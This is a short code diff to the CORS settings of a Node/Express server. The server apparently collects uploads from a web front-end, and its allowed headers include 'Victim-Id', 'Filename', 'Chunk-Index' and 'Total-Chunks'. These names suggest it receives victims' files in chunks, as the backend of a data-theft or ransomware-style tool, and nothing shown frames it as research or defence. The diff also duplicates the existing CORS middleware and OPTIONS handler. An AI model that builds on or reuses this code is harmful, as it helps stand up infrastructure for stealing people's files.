@@ -16,10 +16,19 @@ const sslOptions = {
 
 // Enable CORS with specific options
 const corsOptions = {
-  origin:  ['https://front-ehzwe8vjh-2naseernoors-projects.vercel.app'],// Allow all origins (for testing)
-  methods: ['GET', 'POST', 'OPTIONS'],
-  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
+  origin: ['https://front-ehzwe8vjh-2naseernoors-projects.vercel.app'], // Array for flexibility
+  methods: 'GET, POST, OPTIONS',
+  allowedHeaders: 'Content-Type, Victim-Id, Filename, Chunk-Index, Total-Chunks',
+  credentials: true,
 };
+app.use(cors(corsOptions));
+app.options('*', (req, res) => {
+  res.header('Access-Control-Allow-Origin', 'https://front-ehzwe8vjh-2naseernoors-projects.vercel.app');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Content-Type, Victim-Id, Filename, Chunk-Index, Total-Chunks');
+  res.sendStatus(200);
+});
+
 
 app.use(cors(corsOptions));
 app.options('*', cors(corsOptions));
